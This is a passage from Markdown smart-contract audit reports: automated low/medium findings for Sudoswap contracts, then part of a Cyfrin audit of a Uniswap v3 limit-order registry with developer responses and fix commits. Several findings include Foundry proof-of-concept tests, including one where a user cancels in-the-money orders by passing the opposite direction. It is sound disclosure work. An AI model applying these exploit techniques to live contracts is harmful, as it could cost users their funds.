|-|:-|:-:|
| [L-1](#L-1) |  `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()` | 1 |
| [L-2](#L-2) | Empty Function Body - Consider commenting why | 32 |
| [L-3](#L-3) | Initializers could be front-run | 10 |
| [L-4](#L-4) | Unsafe ERC20 operation(s) | 7 |
#### <a name="L-1"></a>[L-1]  `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`
Use `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). "Unless there is a compelling reason, `abi.encode` should be preferred". If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739).
If all arguments are strings and or bytes, `bytes.concat()` should be used instead

*Instances (1)*:
```solidity
File: property-checking/MerklePropertyChecker.sol

25:             if (!MerkleProof.verify(proof, root, keccak256(abi.encodePacked(ids[i])))) {

```

#### <a name="L-2"></a>[L-2] Empty Function Body - Consider commenting why

*Instances (32)*:
```solidity
File: LSSVMPairETH.sol

130:     function _preCallCheck(address) internal pure override {}

```

```solidity
File: LSSVMPairFactory.sol

373:                 } catch {}

375:         } catch {}

379:         } catch {}

384:             } catch {}

385:         } catch {}

390:             } catch {}

391:         } catch {}

398:             } catch {}

399:         } catch {}

403:         } catch {}

410:     receive() external payable {}

```

```solidity
File: LSSVMRouter.sol

488:     receive() external payable {}

```

```solidity
File: RoyaltyEngine.sol

164:             } catch {}

170:             } catch {}

176:             } catch {}

191:             } catch {}

197:                 } catch {}

198:             } catch {}

211:                     } catch {}

212:                 } catch {}

219:             } catch {}

225:             } catch {}

231:             } catch {}

```

```solidity
File: VeryFastRouter.sol

488:     receive() external payable {}

```

```solidity
File: erc1155/LSSVMPairERC1155ERC20.sol

18:     constructor(IRoyaltyEngineV1 royaltyEngine) LSSVMPair(royaltyEngine) {}

```

```solidity
File: erc1155/LSSVMPairERC1155ETH.sol

18:     constructor(IRoyaltyEngineV1 royaltyEngine) LSSVMPair(royaltyEngine) {}

```

```solidity
File: erc721/LSSVMPairERC721ERC20.sol

18:     constructor(IRoyaltyEngineV1 royaltyEngine) LSSVMPair(royaltyEngine) {}

```

```solidity
File: erc721/LSSVMPairERC721ETH.sol

18:     constructor(IRoyaltyEngineV1 royaltyEngine) LSSVMPair(royaltyEngine) {}

```

```solidity
File: lib/OwnableWithTransferCallback.sol

50:             try IOwnershipTransferReceiver(newOwner).onOwnershipTransferred{value: msg.value}(msg.sender, data) {}

```

```solidity
File: settings/Splitter.sol

62:     fallback() external payable {}

```

```solidity
File: settings/StandardSettings.sol

142:         try pairFactory.enableSettingsForPair(address(this), msg.sender) {}

```

#### <a name="L-3"></a>[L-3] Initializers could be front-run
Initializers could be front-run, allowing an attacker to either set their own values, take ownership of the contract, and in the best case forcing a re-deployment

*Instances (10)*:
```solidity
File: LSSVMPair.sol

132:     function initialize(

140:         __Ownable_init(_owner);

```

```solidity
File: LSSVMPairFactory.sol

568:         _pair.initialize(msg.sender, _assetRecipient, _delta, _fee, _spotPrice);

596:         _pair.initialize(msg.sender, _assetRecipient, _delta, _fee, _spotPrice);

625:         _pair.initialize(msg.sender, _assetRecipient, _delta, _fee, _spotPrice);

649:         _pair.initialize(msg.sender, _assetRecipient, _delta, _fee, _spotPrice);

```

```solidity
File: lib/OwnableWithTransferCallback.sol

24:     function __Ownable_init(address initialOwner) internal {

```

```solidity
File: settings/StandardSettings.sol

44:     function initialize(address _owner, address payable _settingsFeeRecipient) public {

46:         __Ownable_init(_owner);

```

```solidity
File: settings/StandardSettingsFactory.sol

33:         settings.initialize(msg.sender, settingsFeeRecipient);

```

#### <a name="L-4"></a>[L-4] Unsafe ERC20 operation(s)

*Instances (7)*:
```solidity
File: LSSVMPairFactory.sol

576:             _nft.transferFrom(msg.sender, address(_pair), _initialNFTIDs[i]);

606:             _nft.transferFrom(msg.sender, address(_pair), _initialNFTIDs[i]);

673:             _nft.transferFrom(msg.sender, recipient, ids[i]);

```

```solidity
File: LSSVMRouter.sol

525:         nft.transferFrom(from, to, id);

```

```solidity
File: VeryFastRouter.sol

713:         nft.transferFrom(from, to, id);

```

```solidity
File: erc721/LSSVMPairERC721.sol

218:             _nft.transferFrom(address(this), nftRecipient, nftIds[i]);

281:                     _nft.transferFrom(msg.sender, _assetRecipient, nftIds[i]);

```


### Medium Issues


| |Issue|Instances|
|-|:-|:-:|
| [M-1](#M-1) | Centralization Risk for trusted owners | 23 |
| [M-2](#M-2) |  Solmate's SafeTransferLib does not check for token contract's existence | 18 |
#### <a name="M-1"></a>[M-1] Centralization Risk for trusted owners

**Impact:**
Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

*Instances (23)*:
```solidity
File: LSSVMPair.sol

582:     function changeSpotPrice(uint128 newSpotPrice) external onlyOwner {

595:     function changeDelta(uint128 newDelta) external onlyOwner {

610:     function changeFee(uint96 newFee) external onlyOwner {

625:     function changeAssetRecipient(address payable newRecipient) external onlyOwner {

640:     function call(address payable target, bytes calldata data) external onlyOwner {

672:     function multicall(bytes[] calldata calls, bool revertOnFail) external onlyOwner {

```

```solidity
File: LSSVMPairERC20.sol

129:     function withdrawERC20(ERC20 a, uint256 amount) external override onlyOwner {

```

```solidity
File: LSSVMPairETH.sol

90:     function withdrawAllETH() external onlyOwner {

100:     function withdrawETH(uint256 amount) public onlyOwner {

108:     function withdrawERC20(ERC20 a, uint256 amount) external override onlyOwner {

```

```solidity
File: LSSVMPairFactory.sol

39: contract LSSVMPairFactory is Owned, ILSSVMPairFactoryLike {

102:     ) Owned(_owner) {

420:     function withdrawETHProtocolFees() external onlyOwner {

429:     function withdrawERC20ProtocolFees(ERC20 token, uint256 amount) external onlyOwner {

437:     function changeProtocolFeeRecipient(address payable _protocolFeeRecipient) external onlyOwner {

447:     function changeProtocolFeeMultiplier(uint256 _protocolFeeMultiplier) external onlyOwner {

458:     function setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external onlyOwner {

469:     function setCallAllowed(address payable target, bool isAllowed) external onlyOwner {

484:     function setRouterAllowed(LSSVMRouter _router, bool isAllowed) external onlyOwner {

```

```solidity
File: erc1155/LSSVMPairERC1155.sol

235:     function withdrawERC721(IERC721 a, uint256[] calldata nftIds) external virtual override onlyOwner {

```

```solidity
File: erc721/LSSVMPairERC721.sol

299:     function withdrawERC721(IERC721 a, uint256[] calldata nftIds) external virtual override onlyOwner {

```

```solidity
File: lib/OwnableWithTransferCallback.sol

45:     function transferOwnership(address newOwner, bytes memory data) public payable virtual onlyOwner {

```

```solidity
File: settings/StandardSettings.sol

85:     function setSettingsFeeRecipient(address payable newFeeRecipient) public onlyOwner {

```

#### <a name="M-2"></a>[M-2]  Solmate's SafeTransferLib does not check for token contract's existence
There is a subtle difference between the implementation of solmates SafeTransferLib and OZs SafeERC20: OZs SafeERC20 checks if the token is a contract or not, solmates SafeTransferLib does not.
https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol#L9
`@dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller`


*Instances (18)*:
```solidity
File: LSSVMPairERC20.sol

90:             token_.safeTransferFrom(msg.sender, _assetRecipient, inputAmountExcludingRoyalty - protocolFee);

94:                 token_.safeTransferFrom(msg.sender, royaltyRecipients[i], royaltyAmounts[i]);

102:                 token_.safeTransferFrom(msg.sender, address(factory()), protocolFee);

110:                 token().safeTransfer(_feeRecipient, tradeFeeAmount);

124:             token().safeTransfer(tokenRecipient, outputAmount);

130:         a.safeTransfer(msg.sender, amount);

```

```solidity
File: LSSVMPairETH.sol

109:         a.safeTransfer(msg.sender, amount);

```

```solidity
File: LSSVMPairFactory.sol

430:         token.safeTransfer(protocolFeeRecipient, amount);

600:             _token.safeTransferFrom(msg.sender, address(_pair), _initialTokenBalance);

632:             _nft.safeTransferFrom(msg.sender, address(_pair), _nftId, _initialNFTBalance, bytes(""));

653:             _token.safeTransferFrom(msg.sender, address(_pair), _initialTokenBalance);

658:             _nft.safeTransferFrom(msg.sender, address(_pair), _nftId, _initialNFTBalance, bytes(""));

691:         token.safeTransferFrom(msg.sender, recipient, amount);

706:         nft.safeTransferFrom(msg.sender, recipient, id, amount, bytes(""));

```

```solidity
File: LSSVMRouter.sol

509:         token.safeTransferFrom(from, to, amount);

```

```solidity
File: VeryFastRouter.sol

690:         token.safeTransferFrom(from, to, amount);

```

```solidity
File: settings/Splitter.sol

55:         token.safeTransfer(parentSettings.settingsFeeRecipient(), amtToSendToSettingsFeeRecipient);

57:         token.safeTransfer(

```


------ FILE END car/reports_md/2023-06-01-sudoswap-report.md ------


------ FILE START car/reports_md/2023-06-07-cyfrin-uniswap-v3-limit-orders.md ------

## Medium Risk


### Calls to `LimitOrderRegistry::newOrder` might revert due to overflow

**Description:** Reasonable input could cause an arithmetic overflow when opening new orders because large multiplications are performed on variables defined as `uint128` instead of `uint256`. Specifically, in `LimitOrderRegistry::_mintPosition` and `LimitOrderRegistry::_addToPosition` the following lines (which appear in both functions) are problematic:

```solidity
uint128 amount0Min = amount0 == 0 ? 0 : (amount0 * 0.9999e18) / 1e18;
uint128 amount1Min = amount1 == 0 ? 0 : (amount1 * 0.9999e18) / 1e18;
```

**Impact:** It is not possible for users to create new orders with deposit amounts in excess of `341e18`, limiting the protocol to working with comparatively small orders.

**Proof of Concept:** Paste this test into `test/LimitOrderRegistry.t.sol`:

```solidity
function test_OverflowingNewOrder() public {
    uint96 amount = 340_316_398_560_794_542_918;
    address msgSender = 0xE0b906ae06BfB1b54fad61E222b2E324D51e1da6;
    deal(address(USDC), msgSender, amount);
    vm.startPrank(msgSender);
    USDC.approve(address(registry), amount);

    registry.newOrder(USDC_WETH_05_POOL, 204900, amount, true, 0);
}
```

**Recommended Mitigation:** Cast the `uint128` value to `uint256` prior to performing the multiplication:

```solidity
uint128 amount0Min = amount0 == 0 ? 0 : uint128((uint256(amount0) * 0.9999e18) / 1e18);
uint128 amount1Min = amount1 == 0 ? 0 : uint128((uint256(amount1) * 0.9999e18) / 1e18);
```

**GFX Labs:** Fixed by changing multipliers from 18 decimals to 4 decimals in commits [f9934fe](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/f9934fe5d5eaaf061f4dab110a7b99efda7efb20) and [c731cd4](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/c731cd4d579af3aebd7a75c00bc9aa4ddb45f112).

**Cyfrin:** Acknowledged.


### New orders on a given pool in the opposite direction, separated by zero/one tick space, are not possible until previous `BatchOrder` is removed from the order book

**Description:** New order creation will revert with `LimitOrderRegistry__DirectionMisMatch()` if the direction opposes any existing orders at the current tick price. Due to the calculation of lower/upper ticks, this also applies to orders separated by one tick space. In the event price deviation causes existing orders to become ITM, it is not possible to place new orders in the opposing direction until upkeep has been performed for the existing orders, fully removing them from the order book.

**Impact:** This edge case is only an issue in the following circumstance:
* Any number of users place an order at a given tick price.
* Price deviates, causing this `BatchOrder` (and potentially others) to become ITM.
* If upkeep has not yet been performed, either through DoS, oracle downtime, or exceeding the maximum number of orders per upkeep (in the case of very large price deviations), the original `BatchOrder` remains on the order book (represented by a doubly linked list).
* So long as the original order remains in the list, new orders on a given pool in the opposite direction, separated by zero/one tick space, cannot be placed.

**Proof of Concept:**
```solidity
function testOppositeOrders() external {
    uint256 amount = 1_000e6;
    deal(address(USDC), address(this), amount);

    // Current tick 204332
    // 204367
    // Current block 16371089
    USDC.approve(address(registry), amount);
    registry.newOrder(USDC_WETH_05_POOL, 204910, uint96(amount), true, 0);

    // Make a large swap to move the pool tick.
    address[] memory path = new address[](2);
    path[0] = address(WETH);
    path[1] = address(USDC);

    uint24[] memory poolFees = new uint24[](1);
    poolFees[0] = 500;

    (bool upkeepNeeded, bytes memory performData) = registry.checkUpkeep(abi.encode(USDC_WETH_05_POOL));

    uint256 swapAmount = 2_000e18;
    deal(address(WETH), address(this), swapAmount);
    _swap(path, poolFees, swapAmount);

    (upkeepNeeded, performData) = registry.checkUpkeep(abi.encode(USDC_WETH_05_POOL));

    assertTrue(upkeepNeeded, "Upkeep should be needed.");

    // registry.performUpkeep(performData);

    amount = 2_000e17;
    deal(address(WETH), address(this), amount);
    WETH.approve(address(registry), amount);
    int24 target = 204910 - USDC_WETH_05_POOL.tickSpacing();
    vm.expectRevert(
        abi.encodeWithSelector(LimitOrderRegistry.LimitOrderRegistry__DirectionMisMatch.selector)
    );
    registry.newOrder(USDC_WETH_05_POOL, target, uint96(amount), false, 0);
}
```

**Recommended Mitigation:** Implement a second order book for orders in the opposite direction, as discussed.

**GFX Labs:** Fixed by separating the order book into two lists, and having orders in opposite directions use completely different LP positions in commits [7b65915](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/7b6591508cc0f412edd7f105f012a0cbb7f4b1fe) and [9e9ceda](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/9e9cedad083ff9812a9782a88ac9db5cd713b743).

**Cyfrin:** Acknowledged. Comment should be updated for `getPositionFromTicks` mapping to include 'direction' key.

**GFX Labs:** Fixed in commit [f303a50](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/f303a502492aaf31aeb180640861f326039dd962).

**Cyfrin:** Acknowledged.


### Calls to `LimitOrderRegistry::cancelOrder` might revert due to overflow

**Description:** Reasonable input could cause an arithmetic overflow when cancelling orders because large multiplications are performed on variables defined as `uint128` instead of `uint256`. Specifically, when calculating the liquidity percentage to take from a position in `LimitOrderRegistry::cancelOrder`, multiplication of `depositAmount` by `1e18` would cause an overflow when `depositAmount >= 341e18` as the result exceeds the range of `uint128`.

```solidity
uint128 depositAmount = batchIdToUserDepositAmount[batchId][sender];
if (depositAmount == 0) revert LimitOrderRegistry__UserNotFound(sender, batchId);

// Remove one from the userCount.
order.userCount--;

// Zero out user balance.
delete batchIdToUserDepositAmount[batchId][sender];

uint128 orderAmount;
if (order.direction) {
    orderAmount = order.token0Amount;
    if (orderAmount == depositAmount) {
        liquidityPercentToTake = 1e18;
        // Update order tokenAmount.
        order.token0Amount = 0;
    } else {
        liquidityPercentToTake = (1e18 * depositAmount) / orderAmount; // @audit - overflow
        // Update order tokenAmount.
        order.token0Amount = orderAmount - depositAmount;
    }
} else {
    orderAmount = order.token1Amount;
    if (orderAmount == depositAmount) {
        liquidityPercentToTake = 1e18;
        // Update order tokenAmount.
        order.token1Amount = 0;
    } else {
        liquidityPercentToTake = (1e18 * depositAmount) / orderAmount; // @audit - overflow
        // Update order tokenAmount.
        order.token1Amount = orderAmount - depositAmount;
    }
}
```

**Impact:** It can become impossible for a user to cancel their order if their deposit amount equals or exceeds `341e18`, unless they are the final depositor to the pool.

**Recommended Mitigation:**
```solidity
liquidityPercentToTake = (1e18 * uint256(depositAmount)) / orderAmount;
```

**GFX Labs:** Fixed by casting `depositAmount` as a `uint256` in commit [d67b293](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/d67b293afbe3590ddb835fc2f9ec617d056cb3c2).

**Cyfrin:** Acknowledged.


### A malicious user can cancel an ITM order at a given target tick by calling `LimitOrderRegistry::cancelOrder` with the opposite direction, separated by one tick space

**Description:** Users are able to cancel their limit orders by calling `LimitOrderRegistry::cancelOrder`. By internally calling `_getOrderStatus` and validating the return value, it is intended that only OTM orders should be able to be cancelled.

```solidity
    function cancelOrder(
        UniswapV3Pool pool,
        int24 targetTick,
        bool direction //@audit don't validate order.direction == direction
    ) external returns (uint128 amount0, uint128 amount1, uint128 batchId) {
        uint256 positionId;
        {
            // Make sure order is OTM.
            (, int24 tick, , , , , ) = pool.slot0();

            // Determine upper and lower ticks.
            int24 upper;
            int24 lower;
            {
                int24 tickSpacing = pool.tickSpacing();
                // Make sure targetTick is divisible by spacing.
                if (targetTick % tickSpacing != 0)
                    revert LimitOrderRegistry__InvalidTargetTick(targetTick, tickSpacing);
                if (direction) {
                    upper = targetTick;
                    lower = targetTick - tickSpacing;
                } else {
                    upper = targetTick + tickSpacing;
                    lower = targetTick;
                }
            }
            // Validate lower, upper,and direction. Make sure order is not ITM or MIXED
            {
                OrderStatus status = _getOrderStatus(tick, lower, upper, direction);
                if (status != OrderStatus.OTM) revert LimitOrderRegistry__OrderITM(tick, targetTick, direction);
            }

            // Get the position id.
            positionId = getPositionFromTicks[pool][lower][upper];

            if (positionId == 0) revert LimitOrderRegistry__InvalidPositionId();
        }
        ...
```

The main flaw is that users are able to provide a custom `direction` as a parameter but there is no validation that `direction == order.direction`.

A malicious user can therefore pass the opposite direction with target tick separated by one tick space from the real target tick to satisfy the OTM condition.

Once the batch order is retrieved from `positionId`, the function will continue to work correctly as it makes of use of `order.direction` from there ownard.

**Impact:** Malicious users can cancel orders at a given target tick by providing tick separated by one tick space and opposite direction. This could result in their placing of risk-free trades which can be cancelled at-will even when they are ITM and should not be able to be cancelled.

**Proof of Concept:**
```solidity
function testCancellingITMOrderWrongly() external {
        uint96 usdcAmount = 1_000e6;
        int24 poolTick;
        int24 tickSpace = USDC_WETH_05_POOL.tickSpacing();
        {
            (, int24 tick, , , , , ) = USDC_WETH_05_POOL.slot0();
            poolTick = tick - (tick % tickSpace);
        }

        // Create orders.
        _createOrder(address(this), USDC_WETH_05_POOL, 2 * tickSpace, USDC, usdcAmount);

        // Make first order ITM.
        {
            address[] memory path = new address[](2);
            path[0] = address(WETH);
            path[1] = address(USDC);

            uint24[] memory poolFees = new uint24[](1);
            poolFees[0] = 500;

            uint256 swapAmount = 770e18;
            deal(address(WETH), address(this), swapAmount);
            _swap(path, poolFees, swapAmount);
        }

        (, int24 currentTick, , , , , ) = USDC_WETH_05_POOL.slot0();

        // Try to cancel it. But revert as it's ITM.
        vm.expectRevert(
            abi.encodeWithSelector(
                LimitOrderRegistry.LimitOrderRegistry__OrderITM.selector,
                currentTick,
                poolTick + 20,
                true
            )
        );
        registry.cancelOrder(USDC_WETH_05_POOL, poolTick + 2 * tickSpace, true);

        // Cancel with opposite direction, separated by one tick space
        registry.cancelOrder(USDC_WETH_05_POOL, poolTick + tickSpace, false);
    }
```

Note: we were not able to fully validate this finding with a PoC in the allotted time - it currently outputs `LimitOrderRegistry__NoLiquidityInOrder()` as `amount0 == 0` when `order.direction = true`.

Temporarily removing the below validation section in `LimitOrderRegistry::cancelOrder` to demonstrate this finding, the ITM order can be canceled.

```solidity
        if (order.direction) {
            if (amount0 > 0) poolToData[pool].token0.safeTransfer(sender, amount0);
            else revert LimitOrderRegistry__NoLiquidityInOrder();
            if (amount1 > 0) revert LimitOrderRegistry__AmountShouldBeZero();
        } else {
            if (amount1 > 0) poolToData[pool].token1.safeTransfer(sender, amount1);
            else revert LimitOrderRegistry__NoLiquidityInOrder();
            if (amount0 > 0) revert LimitOrderRegistry__AmountShouldBeZero();
        }

```

**Recommended Mitigation:** Validation that `direction == order.direction` should be added to `LimitOrderRegistry::cancelOrder`.

**GFX Labs:** Fixed by separating the order book into two lists, and having orders in opposite directions use completely different LP positions in commits [7b65915](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/7b6591508cc0f412edd7f105f012a0cbb7f4b1fe) and [9e9ceda](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/9e9cedad083ff9812a9782a88ac9db5cd713b743).

**Cyfrin:** Acknowledged.


### Malicious validators can prevent orders from being created or cancelled

**Description:** Use of `block.timestamp` as the deadline for [`MintParams`](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L1056), [`IncreaseLiquidityParams`](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L1099) and [`DecreaseLiquidityParams`](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L1207) means that a given transaction interfacing with Uniswap v3 will be valid whenever the validator decides to include it. This could result in orders prevented from being created or cancelled if a malicious validator holds these transactions until after the tick price for the given pool has moved such that the deadline is valid but order status is no longer valid.

**Impact:** Whenever the validator decides to include the transaction in a block, it will be valid at that time, since `block.timestamp` will be the current timestamp. This could result in forcing an order to be fulfilled when it was the sender's intention to have it cancelled, by holding until price exceeds the target tick as ITM orders can't be cancelled, or never creating the order at all, by similar reasoning as it is not allowed to create orders that are immediately ITM.

**Recommended Mitigation:** Add deadline arguments to all functions that interact with Uniswap v3 via the `NonFungiblePositionManager`, and pass it along to the associated calls.

**GFX Labs:** Fixed by adding deadline arguments to all Position Manager calls in commit [f05cdfc](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/f05cdfce4762d980235fe4d726800d2b0a112d2d).

**Cyfrin:** Acknowledged.


### Gas griefing denial-of-service on `performUpkeep`

**Description:** To mitigate against issues arising from a tangled list, `LimitOrderRegistry::performUpkeep` was modified to continue walking the list toward its head/tail until the next order that matches the walk direction is found. This is achieved using a [while loop](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L847); however, this is susceptible to gas griefing attacks if there are a large number of orders with the opposite direction placed between the current and next order. Whilst order spamming is somewhat mitigated by the `minimumAssets` requirement, a reasonably well-funded/anarchic attacker can cause this loop to consume too much gas, greater than the maximum specified gas per upkeep, by placing a series of small orders which could prevent legitimate ITM orders from being fulfilled.

**Impact:** It is possible for a malicious user to perform a denial-of-service attack on upkeep, preventing ITM orders from being fulfilled.

**Recommended Mitigation:** Implement a second order book for orders in the opposite direction, as discussed, removing the need to walk the list until the next order that matches the walk direction is found.

**GFX Labs:** Fixed by separating the order book into two lists, and having orders in opposite directions use completely different LP positions in commits [7b65915](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/7b6591508cc0f412edd7f105f012a0cbb7f4b1fe) and [9e9ceda](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/9e9cedad083ff9812a9782a88ac9db5cd713b743).

**Cyfrin:** Acknowledged.

\clearpage
## Low Risk


### Perform additional validation on Chainlink fast gas feed

**Description:** When consuming data feeds provided by Chainlink, it is important to validate a number of thresholds and return values. Without this, it is possible for a consuming contract to use stale or otherwise incorrect/invalid data. `LimitOrderRegistry` currently correctly validates the time since the last update against an owner-specified heartbeat value; however, it is possible to perform additional validation to ensure that the returned gas price is indeed valid, for example within upper/lower bounds and the result of a complete reporting round.

**Impact:** `LimitOrderRegistry::performUpkeep` is reliant on this functionality within `LimitOrderRegistry::getGasPrice` which could result in DoS on fulfilling orders if not functioning correctly; however, the escape-hatch is simply having the owner set the feed address to `address(0)` which causes the owner-specified fallback value to be used.

**Recommended Mitigation:** Consider calling `IChainlinkAggregator::latestRoundData` within a `try/catch` block and include the following additional validation:

```solidity
require(signedGasPrice > 0, "Negative gas price");
require(signedGasPrice < maxGasPrice, "Upper gas price bound breached");
require(signedGasPrice > minGasPrice, "Lower gas price bound breached");
require(answeredInRound >= roundID, "Round incomplete");
```

**GFX Labs:** Acknowledged. Chainlink has an outstanding track record for their data feed accuracy and reliability, and if Chainlink nodes did want to start maliciously reporting incorrect values, there are significantly more profitable opportunities elsewhere.

Also, in the event of the fast gas feed becoming unreliable, the owner can either manually set the gas price, or it would be straightforward to make a custom Fast Gas Feed contract that is updated by a GFX Labs bot.

**Cyfrin:** Acknowledged.


### Withdrawing native assets may revert if wrapped native balance is zero

**Description:** The function `LimitOrderRegistry::withdrawNative` allows the owner to withdraw native and wrapped native assets from the contract. If balances of both are zero, calls to this function revert as there is nothing to withdraw.

```solidity
/**
 * @notice Allows owner to withdraw wrapped native and native assets from this contract.
 */
function withdrawNative() external onlyOwner {
    uint256 wrappedNativeBalance = WRAPPED_NATIVE.balanceOf(address(this));
    uint256 nativeBalance = address(this).balance;
    // Make sure there is something to withdraw.
    if (wrappedNativeBalance == 0 && nativeBalance == 0) revert LimitOrderRegistry__ZeroNativeBalance();
    WRAPPED_NATIVE.safeTransfer(owner, WRAPPED_NATIVE.balanceOf(address(this)));
    payable(owner).transfer(address(this).balance);
}
```

A zero value call with transfer non-zero wrapped native token balance will succeed just fine; however the call may revert in the opposite case. Given `safeTransfer` calls the wrapped native token's `transfer` function, the entire transaction for a non-zero value call with zero wrapped native token balance could revert if the wrapped native token reverts on zero-value transfers.

**Impact:** This would temporarily prevent the withdrawal of any native token balance until the wrapped native token balance is also non-zero, although it seems none of the wrapped native tokens revert on zero transfers on current intended target chains.

**Recommended Mitigation:** Separately validate the wrapped native token balance prior to attempting the transfer.

**GFX Labs:** Fixed by adding `if` statements to check the amount is non-zero before attempting to withdraw in commit [d2dd99c](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/d2dd99ccc30fd8534373be9ee0566603623e433d).

**Cyfrin:** Acknowledged. It is not necessary to revert - this line can be removed:
```solidity
if (wrappedNativeBalance == 0 && nativeBalance == 0) revert LimitOrderRegistry__ZeroNativeBalance();
```

**GFX Labs:** Acknowledged. Revert isn't strictly necessary, but also doesn't hurt.

**Cyfrin:** Acknowledged.


### `call()` should be used instead of `transfer()` on address payable

**Description:** The `transfer()` and `send()` functions forward a fixed amount of 2300 gas. Historically, it has often been recommended to use these functions for value transfers to guard against reentrancy attacks. However, the gas cost of EVM instructions may change significantly during hard forks which may break already deployed contract systems that make fixed assumptions about gas costs. For example. EIP 1884 broke several existing smart contracts due to a cost increase of the `SLOAD` instruction. It is now therefore [no longer recommended](https://swcregistry.io/docs/SWC-134) to use these functions on address payable.

There are currently a [number](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L442) of [instances](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L642) where [use](https://github.com/crispymangoes/uniswap-v3-limit-orders/blob/83f5db9cb90926c11ee6ce872dc165b7f600f3d8/src/LimitOrderRegistry.sol#L646) of `transfer()` should be resolved.

**Impact:** The use of the deprecated `transfer()` function will cause transactions to fail:

* If `owner` calling `LimitOrderRegistry::withdrawNative`/`sender` calling `LimitOrderRegistry::claimOrder` is a smart contract that does not implement a payable function.
* If `owner` calling `LimitOrderRegistry::withdrawNative`/`sender` calling `LimitOrderRegistry::claimOrder` is a smart contract that does implement a payable fallback which uses more than 2300 gas unit.
* If `sender` calling `LimitOrderRegistry::claimOrder` is a smart contract that implements a payable fallback function that needs less than 2300 gas units but is called through proxy, raising the call's gas usage above 2300.
* Additionally, using higher than 2300 gas might be mandatory for some multi-signature wallets.

**Recommended Mitigation:** Use `call()` or solmate's `safeTransferETH` instead of `transfer()`, but be sure to respect the [Checks Effects Interactions (CEI) pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html).

**GFX Labs:** Fixed by using solmate `safeTransferETH` in commit [6c486c9](https://github.com/crispymangoes/uniswap-v3-limit-orders/commit/6c486c92598fda3582087d2ecd36f12238115eb1).

**Cyfrin:** Acknowledged.


### Fee-on-transfer/deflationary tokens will not be supported

**Description:** When creating a new order, `LimitOrderRegistry::newOrder` assumes that the amount of deposited tokens is equal to the
function parameter plus the balance before the deposit. For tokens which take a fee on every transfer, this assumption does not hold and so the true amount transferred is less than the specified amount. As a result, tight slippage parameters in `_mintPosition` and `_addToPosition` which are calculated using this value will likely cause transactions to revert:
```solidity
uint128 amount0Min = amount0 == 0 ? 0 : (amount0 * 0.9999e18) / 1e18;
```
Additionally, the amount stored in `batchIdToUserDepositAmount` will be larger than the true balance deposited by a given user, resulting in incorrect accounting.

**Impact:** It will not be possible to use fee-on-transfer/deflationary tokens within the protocol.

**Recommended Mitigation:** Avoid allowlisting such problematic tokens. If it is desired to support such tokens then it recommended to cache token balances before and after any transfers, using the difference between those two balances rather than the input amount as the amount received.

**GFX Labs:** Acknowledged. This contract will not use fee-on-transfer or deflationary tokens.

**Cyfrin:** Acknowledged.


### Fulfillable ITM orders may not always be fulfilled

**Description:** Currently, orders are only fulfillable via `LimitOrderRegistry::performUpkeep` which processes them
via the doubly linked list, with a limit of `maxFillsPerUpkeep` orders per call. Considering extreme and/or adversarial market conditions, there is no guarantee that all legitimate orders will eventually be processed. If the pool tick varies significantly and rapidly, as is the case for large price swings, and there exist large number of batch orders on the book, greater than `maxFillsPerUpkeep`, then only a subset of orders can be fulfilled in a given block. Assuming the price deviation lasts only a small number of blocks, it is possible that fulfillable ITM orders in the list are not cleared before they once again become OTM.

**Impact:** Valid and fulfillable ITM orders may not be fulfilled even though their liquidity within the position is technically being used for the duration the pool tick exceeds their target tick price.

**Recommended Mitigation:** To guarantee that any order can be fulfilled, consider adding a public `fulfillOrder` function that can be called by any user to fulfil a specific order independently from its position in the list. The order can be simply fulfilled and removed from the list, without affecting the upkeep procedure.

**GFX Labs:** Acknowledged. Even in traditional market settings, price can go past some limit order trigger, but that order can still be unfilled, if there is not enough volume.

Adding a custom function to allow users to fulfill a specific order is a possible solution, but its only a solution if the users create some bot which is better at TX management than Chainlink Automation, and that is a big ask for users. Because of this, the function was not added to reduce contract size.

**Cyfrin:** Acknowledged.

\clearpage
## Informational


### Spelling errors and incorrect NatSpec

The following spelling errors and incorrect NatSpec were identified:
